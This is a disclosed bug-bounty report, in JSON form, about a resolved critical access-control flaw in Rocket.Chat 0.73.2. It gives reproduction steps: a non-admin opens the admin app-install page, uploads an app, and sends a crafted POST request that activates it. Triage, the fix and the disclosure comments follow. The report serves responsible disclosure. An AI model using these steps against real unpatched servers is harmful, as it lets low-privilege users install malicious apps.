{"id":491892,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTE4OTI=","url":"https://hackerone.com/reports/491892","title":"Broken access control on apps ","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-02-06T11:51:30.342Z","submitted_at":"2019-02-06T11:51:30.342Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"theappsec","url":"/theappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/292/168/92f5398496b7b145261f847108970ba013387c3e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19858,"url":"https://hackerone.com/rocket_chat","handle":"rocket_chat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Rocket.Chat","twitter_handle":"RocketChat","website":"https://rocket.chat","about":"Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-06-22T08:41:48.343Z","bug_reporter_agreed_on_going_public_at":"2019-05-23T08:41:41.718Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \n\nThe user without administrative privileges can upload and install any Application into the rocket.chat\nAs ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.\n\n## Releases Affected:\n\n  * 0.73.2\n\n## Steps To Reproduce:\n- User log-in into the chat\n- User open the following link:\n\n```\nhttp://\u003crocket-chat.link\u003e\u003e/admin/app/install\n```\n- Upload any app\n- Activate it by send the following POST request to the installed app:\n\n```http\nPOST /api/apps/\u003cID_of_the_installed_App\u003e/status HTTP/1.1\nHost: rocket-chat.link\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-User-Id: [redacted]\nX-Auth-Token: [redacted]\nX-Requested-With: XMLHttpRequest\nCookie: [redacted]\nDNT: 1\nConnection: close\nContent-Length: 29\n\n{\"status\":\"manually_enabled\"}\n```\n\n## Supporting Material/References:\n\nYou can see the uploading process in the attached video. Left user is admin, right -  user without any additional privileges. \n\n## Suggested mitigation\nManaging apps should be available to admins only.\n\n## Impact\n\nUsers can install and activate malicious apps into the rocket.chat.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eThe user without administrative privileges can upload and install any Application into the rocket.chat\u003cbr\u003e\nAs ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.\u003c/p\u003e\n\n\u003ch2 id=\"releases-affected\"\u003eReleases Affected:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e0.73.2\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eUser log-in into the chat\u003c/li\u003e\n\u003cli\u003eUser open the following link:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://\u0026lt;rocket-chat.link\u0026gt;\u0026gt;/admin/app/install\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eUpload any app\u003c/li\u003e\n\u003cli\u003eActivate it by send the following POST request to the installed app:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/apps/\u0026lt;ID_of_the_installed_App\u0026gt;/status\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003erocket-chat.link\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e*/*\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-User-Id\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e[redacted]\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Auth-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e[redacted]\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e[redacted]\u003c/span\u003e\n\u003cspan class=\"na\"\u003eDNT\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e29\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;status\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;manually_enabled\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eYou can see the uploading process in the attached video. Left user is admin, right -  user without any additional privileges. \u003c/p\u003e\n\n\u003ch2 id=\"suggested-mitigation\"\u003eSuggested mitigation\u003c/h2\u003e\n\n\u003cp\u003eManaging apps should be available to admins only.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eUsers can install and activate malicious apps into the rocket.chat.\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":419022,"file_name":"rocket-upload-plugins-2019-02-06_13.06.45.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/419/022/011ab4c35046ff29fa23e5d78779e93d4f69536e/rocket-upload-plugins-2019-02-06_13.06.45.mp4?response-content-disposition=attachment%3B%20filename%3D%22rocket-upload-plugins-2019-02-06_13.06.45.mp4%22%3B%20filename%2A%3DUTF-8%27%27rocket-upload-plugins-2019-02-06_13.06.45.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060718Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=bd2c1b381ebb1dbcf483f77ca3c52ccede3685c7e0ea018a46ed6f6a65450483","file_size":1371322,"type":"video/mp4"}],"allow_singular_disclosure_at":"2019-06-22T08:41:41.792Z","allow_singular_disclosure_after":-48029137.12560738,"singular_disclosure_allowed":true,"vote_count":8,"voters":["mygf","bb00x","tems","clarckowen_","sypowicz","wischutz","black03r","amginelive"],"severity":{"rating":"critical","score":9.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4143979,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-13T17:56:47.819Z","updated_at":"2019-02-13T17:56:47.819Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4143985,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"It was addressed via https://github.com/RocketChat/Rocket.Chat/pull/13430","markdown_message":"\u003cp\u003eIt was addressed via \u003ca title=\"https://github.com/RocketChat/Rocket.Chat/pull/13430\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat%2Fpull%2F13430\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/RocketChat/Rocket.Chat/pull/13430\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-13T17:58:08.344Z","updated_at":"2019-02-13T17:58:08.344Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"theappsec","url":"/theappsec"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4908006,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @rodrigok, \nIs it okay to disclose?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/rodrigok\"\u003e@rodrigok\u003c/a\u003e, \u003cbr\u003e\nIs it okay to disclose?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-23T08:41:41.743Z","updated_at":"2019-05-23T08:41:41.743Z","first_to_agree":true,"actor":{"username":"theappsec","cleared":false,"url":"/theappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/292/168/92f5398496b7b145261f847108970ba013387c3e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5140545,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@theappsec I think so","markdown_message":"\u003cp\u003e\u003ca href=\"/theappsec\"\u003e@theappsec\u003c/a\u003e I think so\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-19T21:47:24.396Z","updated_at":"2019-06-19T21:47:24.396Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5167490,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-22T08:41:48.362Z","updated_at":"2019-06-22T08:41:48.362Z","actor":{"url":"/rocket_chat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Rocket.Chat"}},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}